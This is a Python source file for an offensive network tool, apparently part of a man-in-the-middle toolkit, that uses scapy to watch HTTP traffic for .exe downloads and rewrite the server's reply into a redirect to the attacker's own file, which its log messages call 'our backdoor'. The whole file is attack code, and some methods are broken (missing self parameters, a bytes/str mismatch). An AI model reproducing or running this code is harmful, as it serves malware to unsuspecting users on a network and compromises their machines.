from threading import Thread, Event
import logging
import socket
import scapy.all as scapy

class DownloadReplacer(Thread):
    def __init__(self, *args):
        super().__init__()
        self.print_name = "DL replacer"
        self.logger = args[0]
        self.server_ip = self.getIP()
        self.file_path = 'secret.exe'
        self.classPrint("Initializing.", "[+]")
        self.payload = "HTTP/1.1 301 Moved Permanently\nLocation: {}/{}\n\n".format(self.server_ip,self.file_path)
        self.acks = []

    def getIP(self):
        return((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])

    def handlePacket(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:
                if ".exe" in scapy_packet[scapy.Raw].load:
                    self.classPrint("User downloading .exe file!","[+]")
                    self.acks.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in self.acks:
                    self.acks.append(scapy_packet[scapy.TCP].seq)
                    self.classPrint("Replacing .exe file with our backdoor", "[+]")
                    new_packet = self.setPayload(scapy_packet, self.payload)
                    packet.set_payload(str(new_packet))
        packet.accept()

    def run(self):
        self.classPrint("Replacing .exe downloads with our own file.\n\t\t\tFile should be served at :{}/{}".format(self.server_ip, self.file_path), "[i]")

    def setPayload(packet, payload):
        packet[scapy.Raw].load = payload
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def classPrint(self, text, icon):
        #Adds a class name to the printed messages.
        msg = "{} {}   -> \t{}".format(icon,self.print_name,text)
        self.logger.info(msg)
